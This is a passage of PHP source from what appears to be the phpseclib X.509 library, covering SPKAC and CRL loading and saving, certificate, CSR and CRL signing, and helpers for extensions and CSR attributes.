        $this->signatureSubject = substr($orig, $decoded[0]['content'][0]['start'], $decoded[0]['content'][0]['length']);

        $algorithm = &$spkac['publicKeyAndChallenge']['spki']['algorithm']['algorithm'];
        $key = &$spkac['publicKeyAndChallenge']['spki']['subjectPublicKey'];
        $key = $this->_reformatKey($algorithm, $key);

        switch ($algorithm) {
            case 'rsaEncryption':
                if (!class_exists('Crypt_RSA')) {
                    include_once 'Crypt/RSA.php';
                }
                $this->publicKey = new Crypt_RSA();
                $this->publicKey->loadKey($key);
                $this->publicKey->setPublicKey();
                break;
            default:
                $this->publicKey = null;
        }

        $this->currentKeyIdentifier = null;
        $this->currentCert = $spkac;

        return $spkac;
    }

    /**
     * Save a SPKAC CSR request
     *
     * @param array $csr
     * @param int $format optional
     * @access public
     * @return string
     */
    function saveSPKAC($spkac, $format = FILE_X509_FORMAT_PEM)
    {
        if (!is_array($spkac) || !isset($spkac['publicKeyAndChallenge'])) {
            return false;
        }

        $algorithm = $this->_subArray($spkac, 'publicKeyAndChallenge/spki/algorithm/algorithm');
        switch (true) {
            case !$algorithm:
            case is_object($spkac['publicKeyAndChallenge']['spki']['subjectPublicKey']):
                break;
            default:
                switch ($algorithm) {
                    case 'rsaEncryption':
                        $spkac['publicKeyAndChallenge']['spki']['subjectPublicKey']
                            = base64_encode("\0" . base64_decode(preg_replace('#-.+-|[\r\n]#', '', $spkac['publicKeyAndChallenge']['spki']['subjectPublicKey'])));
                }
        }

        $asn1 = new File_ASN1();

        $asn1->loadOIDs($this->oids);
        $spkac = $asn1->encodeDER($spkac, $this->SignedPublicKeyAndChallenge);

        switch ($format) {
            case FILE_X509_FORMAT_DER:
                return $spkac;
            // case FILE_X509_FORMAT_PEM:
            default:
                // OpenSSL's implementation of SPKAC requires the SPKAC be preceded by SPKAC= and since there are pretty much
                // no other SPKAC decoders phpseclib will use that same format
                return 'SPKAC=' . base64_encode($spkac);
        }
    }

    /**
     * Load a Certificate Revocation List
     *
     * @param string $crl
     * @access public
     * @return mixed
     */
    function loadCRL($crl, $mode = FILE_X509_FORMAT_AUTO_DETECT)
    {
        if (is_array($crl) && isset($crl['tbsCertList'])) {
            $this->currentCert = $crl;
            unset($this->signatureSubject);
            return $crl;
        }

        $asn1 = new File_ASN1();

        if ($mode != FILE_X509_FORMAT_DER) {
            $newcrl = $this->_extractBER($crl);
            if ($mode == FILE_X509_FORMAT_PEM && $crl == $newcrl) {
                return false;
            }
            $crl = $newcrl;
        }
        $orig = $crl;

        if ($crl === false) {
            $this->currentCert = false;
            return false;
        }

        $asn1->loadOIDs($this->oids);
        $decoded = $asn1->decodeBER($crl);

        if (empty($decoded)) {
            $this->currentCert = false;
            return false;
        }

        $crl = $asn1->asn1map($decoded[0], $this->CertificateList);
        if (!isset($crl) || $crl === false) {
            $this->currentCert = false;
            return false;
        }

        $this->signatureSubject = substr($orig, $decoded[0]['content'][0]['start'], $decoded[0]['content'][0]['length']);

        $this->_mapInDNs($crl, 'tbsCertList/issuer/rdnSequence', $asn1);
        if ($this->_isSubArrayValid($crl, 'tbsCertList/crlExtensions')) {
            $this->_mapInExtensions($crl, 'tbsCertList/crlExtensions', $asn1);
        }
        if ($this->_isSubArrayValid($crl, 'tbsCertList/revokedCertificates')) {
            $rclist_ref = &$this->_subArrayUnchecked($crl, 'tbsCertList/revokedCertificates');
            if ($rclist_ref) {
                $rclist = $crl['tbsCertList']['revokedCertificates'];
                foreach ($rclist as $i => $extension) {
                    if ($this->_isSubArrayValid($rclist, "$i/crlEntryExtensions", $asn1)) {
                        $this->_mapInExtensions($rclist_ref, "$i/crlEntryExtensions", $asn1);
                    }
                }
            }
        }

        $this->currentKeyIdentifier = null;
        $this->currentCert = $crl;

        return $crl;
    }

    /**
     * Save Certificate Revocation List.
     *
     * @param array $crl
     * @param int $format optional
     * @access public
     * @return string
     */
    function saveCRL($crl, $format = FILE_X509_FORMAT_PEM)
    {
        if (!is_array($crl) || !isset($crl['tbsCertList'])) {
            return false;
        }

        $asn1 = new File_ASN1();

        $asn1->loadOIDs($this->oids);

        $filters = array();
        $filters['tbsCertList']['issuer']['rdnSequence']['value']
            = array('type' => FILE_ASN1_TYPE_UTF8_STRING);
        $filters['tbsCertList']['signature']['parameters']
            = array('type' => FILE_ASN1_TYPE_UTF8_STRING);
        $filters['signatureAlgorithm']['parameters']
            = array('type' => FILE_ASN1_TYPE_UTF8_STRING);

        if (empty($crl['tbsCertList']['signature']['parameters'])) {
            $filters['tbsCertList']['signature']['parameters']
                = array('type' => FILE_ASN1_TYPE_NULL);
        }

        if (empty($crl['signatureAlgorithm']['parameters'])) {
            $filters['signatureAlgorithm']['parameters']
                = array('type' => FILE_ASN1_TYPE_NULL);
        }

        $asn1->loadFilters($filters);

        $this->_mapOutDNs($crl, 'tbsCertList/issuer/rdnSequence', $asn1);
        $this->_mapOutExtensions($crl, 'tbsCertList/crlExtensions', $asn1);
        $rclist = &$this->_subArray($crl, 'tbsCertList/revokedCertificates');
        if (is_array($rclist)) {
            foreach ($rclist as $i => $extension) {
                $this->_mapOutExtensions($rclist, "$i/crlEntryExtensions", $asn1);
            }
        }

        $crl = $asn1->encodeDER($crl, $this->CertificateList);

        switch ($format) {
            case FILE_X509_FORMAT_DER:
                return $crl;
            // case FILE_X509_FORMAT_PEM:
            default:
                return "-----BEGIN X509 CRL-----\r\n" . chunk_split(base64_encode($crl), 64) . '-----END X509 CRL-----';
        }
    }

    /**
     * Helper function to build a time field according to RFC 3280 section
     *  - 4.1.2.5 Validity
     *  - 5.1.2.4 This Update
     *  - 5.1.2.5 Next Update
     *  - 5.1.2.6 Revoked Certificates
     * by choosing utcTime iff year of date given is before 2050 and generalTime else.
     *
     * @param string $date in format date('D, d M Y H:i:s O')
     * @access private
     * @return array
     */
    function _timeField($date)
    {
        $year = @gmdate("Y", @strtotime($date)); // the same way ASN1.php parses this
        if ($year < 2050) {
            return array('utcTime' => $date);
        } else {
            return array('generalTime' => $date);
        }
    }

    /**
     * Sign an X.509 certificate
     *
     * $issuer's private key needs to be loaded.
     * $subject can be either an existing X.509 cert (if you want to resign it),
     * a CSR or something with the DN and public key explicitly set.
     *
     * @param File_X509 $issuer
     * @param File_X509 $subject
     * @param string $signatureAlgorithm optional
     * @access public
     * @return mixed
     */
    function sign($issuer, $subject, $signatureAlgorithm = 'sha1WithRSAEncryption')
    {
        if (!is_object($issuer->privateKey) || empty($issuer->dn)) {
            return false;
        }

        if (isset($subject->publicKey) && !($subjectPublicKey = $subject->_formatSubjectPublicKey())) {
            return false;
        }

        $currentCert = isset($this->currentCert) ? $this->currentCert : null;
        $signatureSubject = isset($this->signatureSubject) ? $this->signatureSubject: null;

        if (isset($subject->currentCert) && is_array($subject->currentCert) && isset($subject->currentCert['tbsCertificate'])) {
            $this->currentCert = $subject->currentCert;
            $this->currentCert['tbsCertificate']['signature']['algorithm'] = $signatureAlgorithm;
            $this->currentCert['signatureAlgorithm']['algorithm'] = $signatureAlgorithm;

            if (!empty($this->startDate)) {
                $this->currentCert['tbsCertificate']['validity']['notBefore'] = $this->_timeField($this->startDate);
            }
            if (!empty($this->endDate)) {
                $this->currentCert['tbsCertificate']['validity']['notAfter'] = $this->_timeField($this->endDate);
            }
            if (!empty($this->serialNumber)) {
                $this->currentCert['tbsCertificate']['serialNumber'] = $this->serialNumber;
            }
            if (!empty($subject->dn)) {
                $this->currentCert['tbsCertificate']['subject'] = $subject->dn;
            }
            if (!empty($subject->publicKey)) {
                $this->currentCert['tbsCertificate']['subjectPublicKeyInfo'] = $subjectPublicKey;
            }
            $this->removeExtension('id-ce-authorityKeyIdentifier');
            if (isset($subject->domains)) {
                $this->removeExtension('id-ce-subjectAltName');
            }
        } elseif (isset($subject->currentCert) && is_array($subject->currentCert) && isset($subject->currentCert['tbsCertList'])) {
            return false;
        } else {
            if (!isset($subject->publicKey)) {
                return false;
            }

            $startDate = !empty($this->startDate) ? $this->startDate : @date('D, d M Y H:i:s O');
            $endDate = !empty($this->endDate) ? $this->endDate : @date('D, d M Y H:i:s O', strtotime('+1 year'));
            if (!empty($this->serialNumber)) {
                $serialNumber = $this->serialNumber;
            } else {
                if (!function_exists('crypt_random_string')) {
                    include_once 'Crypt/Random.php';
                }
                /* "The serial number MUST be a positive integer"
                   "Conforming CAs MUST NOT use serialNumber values longer than 20 octets."
                    -- https://tools.ietf.org/html/rfc5280#section-4.1.2.2

                   for the integer to be positive the leading bit needs to be 0 hence the
                   application of a bitmap
                */
                $serialNumber = new Math_BigInteger(crypt_random_string(20) & ("\x7F" . str_repeat("\xFF", 19)), 256);
            }

            $this->currentCert = array(
                'tbsCertificate' =>
                    array(
                        'version' => 'v3',
                        'serialNumber' => $serialNumber, // $this->setserialNumber()
                        'signature' => array('algorithm' => $signatureAlgorithm),
                        'issuer' => false, // this is going to be overwritten later
                        'validity' => array(
                            'notBefore' => $this->_timeField($startDate), // $this->setStartDate()
                            'notAfter' => $this->_timeField($endDate)   // $this->setEndDate()
                        ),
                        'subject' => $subject->dn,
                        'subjectPublicKeyInfo' => $subjectPublicKey
                    ),
                    'signatureAlgorithm' => array('algorithm' => $signatureAlgorithm),
                    'signature'          => false // this is going to be overwritten later
            );

            // Copy extensions from CSR.
            $csrexts = $subject->getAttribute('pkcs-9-at-extensionRequest', 0);

            if (!empty($csrexts)) {
                $this->currentCert['tbsCertificate']['extensions'] = $csrexts;
            }
        }

        $this->currentCert['tbsCertificate']['issuer'] = $issuer->dn;

        if (isset($issuer->currentKeyIdentifier)) {
            $this->setExtension('id-ce-authorityKeyIdentifier', array(
                    //'authorityCertIssuer' => array(
                    //    array(
                    //        'directoryName' => $issuer->dn
                    //    )
                    //),
                    'keyIdentifier' => $issuer->currentKeyIdentifier
                ));
            //$extensions = &$this->currentCert['tbsCertificate']['extensions'];
            //if (isset($issuer->serialNumber)) {
            //    $extensions[count($extensions) - 1]['authorityCertSerialNumber'] = $issuer->serialNumber;
            //}
            //unset($extensions);
        }

        if (isset($subject->currentKeyIdentifier)) {
            $this->setExtension('id-ce-subjectKeyIdentifier', $subject->currentKeyIdentifier);
        }

        $altName = array();

        if (isset($subject->domains) && count($subject->domains)) {
            $altName = array_map(array('File_X509', '_dnsName'), $subject->domains);
        }

        if (isset($subject->ipAddresses) && count($subject->ipAddresses)) {
            // should an IP address appear as the CN if no domain name is specified? idk
            //$ips = count($subject->domains) ? $subject->ipAddresses : array_slice($subject->ipAddresses, 1);
            $ipAddresses = array();
            foreach ($subject->ipAddresses as $ipAddress) {
                $encoded = $subject->_ipAddress($ipAddress);
                if ($encoded !== false) {
                    $ipAddresses[] = $encoded;
                }
            }
            if (count($ipAddresses)) {
                $altName = array_merge($altName, $ipAddresses);
            }
        }

        if (!empty($altName)) {
            $this->setExtension('id-ce-subjectAltName', $altName);
        }

        if ($this->caFlag) {
            $keyUsage = $this->getExtension('id-ce-keyUsage');
            if (!$keyUsage) {
                $keyUsage = array();
            }

            $this->setExtension(
                'id-ce-keyUsage',
                array_values(array_unique(array_merge($keyUsage, array('cRLSign', 'keyCertSign'))))
            );

            $basicConstraints = $this->getExtension('id-ce-basicConstraints');
            if (!$basicConstraints) {
                $basicConstraints = array();
            }

            $this->setExtension(
                'id-ce-basicConstraints',
                array_unique(array_merge(array('cA' => true), $basicConstraints)),
                true
            );

            if (!isset($subject->currentKeyIdentifier)) {
                $this->setExtension('id-ce-subjectKeyIdentifier', base64_encode($this->computeKeyIdentifier($this->currentCert)), false, false);
            }
        }

        // resync $this->signatureSubject
        // save $tbsCertificate in case there are any File_ASN1_Element objects in it
        $tbsCertificate = $this->currentCert['tbsCertificate'];
        $this->loadX509($this->saveX509($this->currentCert));

        $result = $this->_sign($issuer->privateKey, $signatureAlgorithm);
        $result['tbsCertificate'] = $tbsCertificate;

        $this->currentCert = $currentCert;
        $this->signatureSubject = $signatureSubject;

        return $result;
    }

    /**
     * Sign a CSR
     *
     * @access public
     * @return mixed
     */
    function signCSR($signatureAlgorithm = 'sha1WithRSAEncryption')
    {
        if (!is_object($this->privateKey) || empty($this->dn)) {
            return false;
        }

        $origPublicKey = $this->publicKey;
        $class = get_class($this->privateKey);
        $this->publicKey = new $class();
        $this->publicKey->loadKey($this->privateKey->getPublicKey());
        $this->publicKey->setPublicKey();
        if (!($publicKey = $this->_formatSubjectPublicKey())) {
            return false;
        }
        $this->publicKey = $origPublicKey;

        $currentCert = isset($this->currentCert) ? $this->currentCert : null;
        $signatureSubject = isset($this->signatureSubject) ? $this->signatureSubject: null;

        if (isset($this->currentCert) && is_array($this->currentCert) && isset($this->currentCert['certificationRequestInfo'])) {
            $this->currentCert['signatureAlgorithm']['algorithm'] = $signatureAlgorithm;
            if (!empty($this->dn)) {
                $this->currentCert['certificationRequestInfo']['subject'] = $this->dn;
            }
            $this->currentCert['certificationRequestInfo']['subjectPKInfo'] = $publicKey;
        } else {
            $this->currentCert = array(
                'certificationRequestInfo' =>
                    array(
                        'version' => 'v1',
                        'subject' => $this->dn,
                        'subjectPKInfo' => $publicKey
                    ),
                    'signatureAlgorithm' => array('algorithm' => $signatureAlgorithm),
                    'signature'          => false // this is going to be overwritten later
            );
        }

        // resync $this->signatureSubject
        // save $certificationRequestInfo in case there are any File_ASN1_Element objects in it
        $certificationRequestInfo = $this->currentCert['certificationRequestInfo'];
        $this->loadCSR($this->saveCSR($this->currentCert));

        $result = $this->_sign($this->privateKey, $signatureAlgorithm);
        $result['certificationRequestInfo'] = $certificationRequestInfo;

        $this->currentCert = $currentCert;
        $this->signatureSubject = $signatureSubject;

        return $result;
    }

    /**
     * Sign a SPKAC
     *
     * @access public
     * @return mixed
     */
    function signSPKAC($signatureAlgorithm = 'sha1WithRSAEncryption')
    {
        if (!is_object($this->privateKey)) {
            return false;
        }

        $origPublicKey = $this->publicKey;
        $class = get_class($this->privateKey);
        $this->publicKey = new $class();
        $this->publicKey->loadKey($this->privateKey->getPublicKey());
        $this->publicKey->setPublicKey();
        $publicKey = $this->_formatSubjectPublicKey();
        if (!$publicKey) {
            return false;
        }
        $this->publicKey = $origPublicKey;

        $currentCert = isset($this->currentCert) ? $this->currentCert : null;
        $signatureSubject = isset($this->signatureSubject) ? $this->signatureSubject: null;

        // re-signing a SPKAC seems silly but since everything else supports re-signing why not?
        if (isset($this->currentCert) && is_array($this->currentCert) && isset($this->currentCert['publicKeyAndChallenge'])) {
            $this->currentCert['signatureAlgorithm']['algorithm'] = $signatureAlgorithm;
            $this->currentCert['publicKeyAndChallenge']['spki'] = $publicKey;
            if (!empty($this->challenge)) {
                // the bitwise AND ensures that the output is a valid IA5String
                $this->currentCert['publicKeyAndChallenge']['challenge'] = $this->challenge & str_repeat("\x7F", strlen($this->challenge));
            }
        } else {
            $this->currentCert = array(
                'publicKeyAndChallenge' =>
                    array(
                        'spki' => $publicKey,
                        // quoting <https://developer.mozilla.org/en-US/docs/Web/HTML/Element/keygen>,
                        // "A challenge string that is submitted along with the public key. Defaults to an empty string if not specified."
                        // both Firefox and OpenSSL ("openssl spkac -key private.key") behave this way
                        // we could alternatively do this instead if we ignored the specs:
                        // crypt_random_string(8) & str_repeat("\x7F", 8)
                        'challenge' => !empty($this->challenge) ? $this->challenge : ''
                    ),
                    'signatureAlgorithm' => array('algorithm' => $signatureAlgorithm),
                    'signature'          => false // this is going to be overwritten later
            );
        }

        // resync $this->signatureSubject
        // save $publicKeyAndChallenge in case there are any File_ASN1_Element objects in it
        $publicKeyAndChallenge = $this->currentCert['publicKeyAndChallenge'];
        $this->loadSPKAC($this->saveSPKAC($this->currentCert));

        $result = $this->_sign($this->privateKey, $signatureAlgorithm);
        $result['publicKeyAndChallenge'] = $publicKeyAndChallenge;

        $this->currentCert = $currentCert;
        $this->signatureSubject = $signatureSubject;

        return $result;
    }

    /**
     * Sign a CRL
     *
     * $issuer's private key needs to be loaded.
     *
     * @param File_X509 $issuer
     * @param File_X509 $crl
     * @param string $signatureAlgorithm optional
     * @access public
     * @return mixed
     */
    function signCRL($issuer, $crl, $signatureAlgorithm = 'sha1WithRSAEncryption')
    {
        if (!is_object($issuer->privateKey) || empty($issuer->dn)) {
            return false;
        }

        $currentCert = isset($this->currentCert) ? $this->currentCert : null;
        $signatureSubject = isset($this->signatureSubject) ? $this->signatureSubject : null;
        $thisUpdate = !empty($this->startDate) ? $this->startDate : @date('D, d M Y H:i:s O');

        if (isset($crl->currentCert) && is_array($crl->currentCert) && isset($crl->currentCert['tbsCertList'])) {
            $this->currentCert = $crl->currentCert;
            $this->currentCert['tbsCertList']['signature']['algorithm'] = $signatureAlgorithm;
            $this->currentCert['signatureAlgorithm']['algorithm'] = $signatureAlgorithm;
        } else {
            $this->currentCert = array(
                'tbsCertList' =>
                    array(
                        'version' => 'v2',
                        'signature' => array('algorithm' => $signatureAlgorithm),
                        'issuer' => false, // this is going to be overwritten later
                        'thisUpdate' => $this->_timeField($thisUpdate) // $this->setStartDate()
                    ),
                    'signatureAlgorithm' => array('algorithm' => $signatureAlgorithm),
                    'signature'          => false // this is going to be overwritten later
            );
        }

        $tbsCertList = &$this->currentCert['tbsCertList'];
        $tbsCertList['issuer'] = $issuer->dn;
        $tbsCertList['thisUpdate'] = $this->_timeField($thisUpdate);

        if (!empty($this->endDate)) {
            $tbsCertList['nextUpdate'] = $this->_timeField($this->endDate); // $this->setEndDate()
        } else {
            unset($tbsCertList['nextUpdate']);
        }

        if (!empty($this->serialNumber)) {
            $crlNumber = $this->serialNumber;
        } else {
            $crlNumber = $this->getExtension('id-ce-cRLNumber');
            // "The CRL number is a non-critical CRL extension that conveys a
            //  monotonically increasing sequence number for a given CRL scope and
            //  CRL issuer.  This extension allows users to easily determine when a
            //  particular CRL supersedes another CRL."
            // -- https://tools.ietf.org/html/rfc5280#section-5.2.3
            $crlNumber = $crlNumber !== false ? $crlNumber->add(new Math_BigInteger(1)) : null;
        }

        $this->removeExtension('id-ce-authorityKeyIdentifier');
        $this->removeExtension('id-ce-issuerAltName');

        // Be sure version >= v2 if some extension found.
        $version = isset($tbsCertList['version']) ? $tbsCertList['version'] : 0;
        if (!$version) {
            if (!empty($tbsCertList['crlExtensions'])) {
                $version = 1; // v2.
            } elseif (!empty($tbsCertList['revokedCertificates'])) {
                foreach ($tbsCertList['revokedCertificates'] as $cert) {
                    if (!empty($cert['crlEntryExtensions'])) {
                        $version = 1; // v2.
                    }
                }
            }

            if ($version) {
                $tbsCertList['version'] = $version;
            }
        }

        // Store additional extensions.
        if (!empty($tbsCertList['version'])) { // At least v2.
            if (!empty($crlNumber)) {
                $this->setExtension('id-ce-cRLNumber', $crlNumber);
            }

            if (isset($issuer->currentKeyIdentifier)) {
                $this->setExtension('id-ce-authorityKeyIdentifier', array(
                        //'authorityCertIssuer' => array(
                        //    array(
                        //        'directoryName' => $issuer->dn
                        //    )
                        //),
                        'keyIdentifier' => $issuer->currentKeyIdentifier
                    ));
                //$extensions = &$tbsCertList['crlExtensions'];
                //if (isset($issuer->serialNumber)) {
                //    $extensions[count($extensions) - 1]['authorityCertSerialNumber'] = $issuer->serialNumber;
                //}
                //unset($extensions);
            }

            $issuerAltName = $this->getExtension('id-ce-subjectAltName', $issuer->currentCert);

            if ($issuerAltName !== false) {
                $this->setExtension('id-ce-issuerAltName', $issuerAltName);
            }
        }

        if (empty($tbsCertList['revokedCertificates'])) {
            unset($tbsCertList['revokedCertificates']);
        }

        unset($tbsCertList);

        // resync $this->signatureSubject
        // save $tbsCertList in case there are any File_ASN1_Element objects in it
        $tbsCertList = $this->currentCert['tbsCertList'];
        $this->loadCRL($this->saveCRL($this->currentCert));

        $result = $this->_sign($issuer->privateKey, $signatureAlgorithm);
        $result['tbsCertList'] = $tbsCertList;

        $this->currentCert = $currentCert;
        $this->signatureSubject = $signatureSubject;

        return $result;
    }

    /**
     * X.509 certificate signing helper function.
     *
     * @param object $key
     * @param File_X509 $subject
     * @param string $signatureAlgorithm
     * @access public
     * @return mixed
     */
    function _sign($key, $signatureAlgorithm)
    {
        switch (strtolower(get_class($key))) {
            case 'crypt_rsa':
                switch ($signatureAlgorithm) {
                    case 'md2WithRSAEncryption':
                    case 'md5WithRSAEncryption':
                    case 'sha1WithRSAEncryption':
                    case 'sha224WithRSAEncryption':
                    case 'sha256WithRSAEncryption':
                    case 'sha384WithRSAEncryption':
                    case 'sha512WithRSAEncryption':
                        $key->setHash(preg_replace('#WithRSAEncryption$#', '', $signatureAlgorithm));
                        $key->setSignatureMode(CRYPT_RSA_SIGNATURE_PKCS1);

                        $this->currentCert['signature'] = base64_encode("\0" . $key->sign($this->signatureSubject));
                        return $this->currentCert;
                }
            default:
                return false;
        }
    }

    /**
     * Set certificate start date
     *
     * @param string $date
     * @access public
     */
    function setStartDate($date)
    {
        $this->startDate = @date('D, d M Y H:i:s O', @strtotime($date));
    }

    /**
     * Set certificate end date
     *
     * @param string $date
     * @access public
     */
    function setEndDate($date)
    {
        /*
          To indicate that a certificate has no well-defined expiration date,
          the notAfter SHOULD be assigned the GeneralizedTime value of
          99991231235959Z.

          -- http://tools.ietf.org/html/rfc5280#section-4.1.2.5
        */
        if (strtolower($date) == 'lifetime') {
            $temp = '99991231235959Z';
            $asn1 = new File_ASN1();
            $temp = chr(FILE_ASN1_TYPE_GENERALIZED_TIME) . $asn1->_encodeLength(strlen($temp)) . $temp;
            $this->endDate = new File_ASN1_Element($temp);
        } else {
            $this->endDate = @date('D, d M Y H:i:s O', @strtotime($date));
        }
    }

    /**
     * Set Serial Number
     *
     * @param string $serial
     * @param $base optional
     * @access public
     */
    function setSerialNumber($serial, $base = -256)
    {
        $this->serialNumber = new Math_BigInteger($serial, $base);
    }

    /**
     * Turns the certificate into a certificate authority
     *
     * @access public
     */
    function makeCA()
    {
        $this->caFlag = true;
    }

    /**
     * Check for validity of subarray
     *
     * This is intended for use in conjunction with _subArrayUnchecked(),
     * implementing the checks included in _subArray() but without copying
     * a potentially large array by passing its reference by-value to is_array().
     *
     * @param array $root
     * @param string $path
     * @return boolean
     * @access private
     */
    function _isSubArrayValid($root, $path)
    {
        if (!is_array($root)) {
            return false;
        }

        foreach (explode('/', $path) as $i) {
            if (!is_array($root)) {
                return false;
            }

            if (!isset($root[$i])) {
                return true;
            }

            $root = $root[$i];
        }

        return true;
    }

    /**
     * Get a reference to a subarray
     *
     * This variant of _subArray() does no is_array() checking,
     * so $root should be checked with _isSubArrayValid() first.
     *
     * This is here for performance reasons:
     * Passing a reference (i.e. $root) by-value (i.e. to is_array())
     * creates a copy. If $root is an especially large array, this is expensive.
     *
     * @param array $root
     * @param string $path  absolute path with / as component separator
     * @param bool $create optional
     * @access private
     * @return array|false
     */
    function &_subArrayUnchecked(&$root, $path, $create = false)
    {
        $false = false;

        foreach (explode('/', $path) as $i) {
            if (!isset($root[$i])) {
                if (!$create) {
                    return $false;
                }

                $root[$i] = array();
            }

            $root = &$root[$i];
        }

        return $root;
    }

    /**
     * Get a reference to a subarray
     *
     * @param array $root
     * @param string $path  absolute path with / as component separator
     * @param bool $create optional
     * @access private
     * @return array|false
     */
    function &_subArray(&$root, $path, $create = false)
    {
        $false = false;

        if (!is_array($root)) {
            return $false;
        }

        foreach (explode('/', $path) as $i) {
            if (!is_array($root)) {
                return $false;
            }

            if (!isset($root[$i])) {
                if (!$create) {
                    return $false;
                }

                $root[$i] = array();
            }

            $root = &$root[$i];
        }

        return $root;
    }

    /**
     * Get a reference to an extension subarray
     *
     * @param array $root
     * @param string $path optional absolute path with / as component separator
     * @param bool $create optional
     * @access private
     * @return array|false
     */
    function &_extensions(&$root, $path = null, $create = false)
    {
        if (!isset($root)) {
            $root = $this->currentCert;
        }

        switch (true) {
            case !empty($path):
            case !is_array($root):
                break;
            case isset($root['tbsCertificate']):
                $path = 'tbsCertificate/extensions';
                break;
            case isset($root['tbsCertList']):
                $path = 'tbsCertList/crlExtensions';
                break;
            case isset($root['certificationRequestInfo']):
                $pth = 'certificationRequestInfo/attributes';
                $attributes = &$this->_subArray($root, $pth, $create);

                if (is_array($attributes)) {
                    foreach ($attributes as $key => $value) {
                        if ($value['type'] == 'pkcs-9-at-extensionRequest') {
                            $path = "$pth/$key/value/0";
                            break 2;
                        }
                    }
                    if ($create) {
                        $key = count($attributes);
                        $attributes[] = array('type' => 'pkcs-9-at-extensionRequest', 'value' => array());
                        $path = "$pth/$key/value/0";
                    }
                }
                break;
        }

        $extensions = &$this->_subArray($root, $path, $create);

        if (!is_array($extensions)) {
            $false = false;
            return $false;
        }

        return $extensions;
    }

    /**
     * Remove an Extension
     *
     * @param string $id
     * @param string $path optional
     * @access private
     * @return bool
     */
    function _removeExtension($id, $path = null)
    {
        $extensions = &$this->_extensions($this->currentCert, $path);

        if (!is_array($extensions)) {
            return false;
        }

        $result = false;
        foreach ($extensions as $key => $value) {
            if ($value['extnId'] == $id) {
                unset($extensions[$key]);
                $result = true;
            }
        }

        $extensions = array_values($extensions);
        return $result;
    }

    /**
     * Get an Extension
     *
     * Returns the extension if it exists and false if not
     *
     * @param string $id
     * @param array $cert optional
     * @param string $path optional
     * @access private
     * @return mixed
     */
    function _getExtension($id, $cert = null, $path = null)
    {
        $extensions = $this->_extensions($cert, $path);

        if (!is_array($extensions)) {
            return false;
        }

        foreach ($extensions as $key => $value) {
            if ($value['extnId'] == $id) {
                return $value['extnValue'];
            }
        }

        return false;
    }

    /**
     * Returns a list of all extensions in use
     *
     * @param array $cert optional
     * @param string $path optional
     * @access private
     * @return array
     */
    function _getExtensions($cert = null, $path = null)
    {
        $exts = $this->_extensions($cert, $path);
        $extensions = array();

        if (is_array($exts)) {
            foreach ($exts as $extension) {
                $extensions[] = $extension['extnId'];
            }
        }

        return $extensions;
    }

    /**
     * Set an Extension
     *
     * @param string $id
     * @param mixed $value
     * @param bool $critical optional
     * @param bool $replace optional
     * @param string $path optional
     * @access private
     * @return bool
     */
    function _setExtension($id, $value, $critical = false, $replace = true, $path = null)
    {
        $extensions = &$this->_extensions($this->currentCert, $path, true);

        if (!is_array($extensions)) {
            return false;
        }

        $newext = array('extnId'  => $id, 'critical' => $critical, 'extnValue' => $value);

        foreach ($extensions as $key => $value) {
            if ($value['extnId'] == $id) {
                if (!$replace) {
                    return false;
                }

                $extensions[$key] = $newext;
                return true;
            }
        }

        $extensions[] = $newext;
        return true;
    }

    /**
     * Remove a certificate, CSR or CRL Extension
     *
     * @param string $id
     * @access public
     * @return bool
     */
    function removeExtension($id)
    {
        return $this->_removeExtension($id);
    }

    /**
     * Get a certificate, CSR or CRL Extension
     *
     * Returns the extension if it exists and false if not
     *
     * @param string $id
     * @param array $cert optional
     * @access public
     * @return mixed
     */
    function getExtension($id, $cert = null)
    {
        return $this->_getExtension($id, $cert);
    }

    /**
     * Returns a list of all extensions in use in certificate, CSR or CRL
     *
     * @param array $cert optional
     * @access public
     * @return array
     */
    function getExtensions($cert = null)
    {
        return $this->_getExtensions($cert);
    }

    /**
     * Set a certificate, CSR or CRL Extension
     *
     * @param string $id
     * @param mixed $value
     * @param bool $critical optional
     * @param bool $replace optional
     * @access public
     * @return bool
     */
    function setExtension($id, $value, $critical = false, $replace = true)
    {
        return $this->_setExtension($id, $value, $critical, $replace);
    }

    /**
     * Remove a CSR attribute.
     *
     * @param string $id
     * @param int $disposition optional
     * @access public
     * @return bool
     */
    function removeAttribute($id, $disposition = FILE_X509_ATTR_ALL)
    {
        $attributes = &$this->_subArray($this->currentCert, 'certificationRequestInfo/attributes');

        if (!is_array($attributes)) {
            return false;
        }

        $result = false;
        foreach ($attributes as $key => $attribute) {
            if ($attribute['type'] == $id) {
                $n = count($attribute['value']);
                switch (true) {
                    case $disposition == FILE_X509_ATTR_APPEND:
                    case $disposition == FILE_X509_ATTR_REPLACE:
                        return false;
                    case $disposition >= $n:
                        $disposition -= $n;
                        break;
                    case $disposition == FILE_X509_ATTR_ALL:
                    case $n == 1:
                        unset($attributes[$key]);
                        $result = true;
                        break;
                    default:
                        unset($attributes[$key]['value'][$disposition]);
                        $attributes[$key]['value'] = array_values($attributes[$key]['value']);
                        $result = true;
                        break;
                }
                if ($result && $disposition != FILE_X509_ATTR_ALL) {
                    break;
                }
            }
        }

        $attributes = array_values($attributes);
        return $result;
    }

    /**
     * Get a CSR attribute
     *
     * Returns the attribute if it exists and false if not
     *
     * @param string $id
     * @param int $disposition optional
     * @param array $csr optional
     * @access public
     * @return mixed
     */
    function getAttribute($id, $disposition = FILE_X509_ATTR_ALL, $csr = null)
    {
        if (empty($csr)) {
            $csr = $this->currentCert;
        }

        $attributes = $this->_subArray($csr, 'certificationRequestInfo/attributes');

        if (!is_array($attributes)) {
            return false;
        }

        foreach ($attributes as $key => $attribute) {
            if ($attribute['type'] == $id) {
                $n = count($attribute['value']);
                switch (true) {
                    case $disposition == FILE_X509_ATTR_APPEND:
                    case $disposition == FILE_X509_ATTR_REPLACE:
                        return false;
                    case $disposition == FILE_X509_ATTR_ALL:
                        return $attribute['value'];
                    case $disposition >= $n:
                        $disposition -= $n;
                        break;
                    default:
                        return $attribute['value'][$disposition];
                }
            }
        }

        return false;
    }

    /**
     * Returns a list of all CSR attributes in use
     *
     * @param array $csr optional
     * @access public
     * @return array
     */
    function getAttributes($csr = null)
    {
        if (empty($csr)) {
            $csr = $this->currentCert;
        }

        $attributes = $this->_subArray($csr, 'certificationRequestInfo/attributes');
        $attrs = array();

        if (is_array($attributes)) {
            foreach ($attributes as $attribute) {
                $attrs[] = $attribute['type'];
            }
        }

        return $attrs;
    }

    /**
     * Set a CSR attribute
     *
     * @param string $id
     * @param mixed $value
     * @param bool $disposition optional
     * @access public
     * @return bool
     */
    function setAttribute($id, $value, $disposition = FILE_X509_ATTR_ALL)
    {
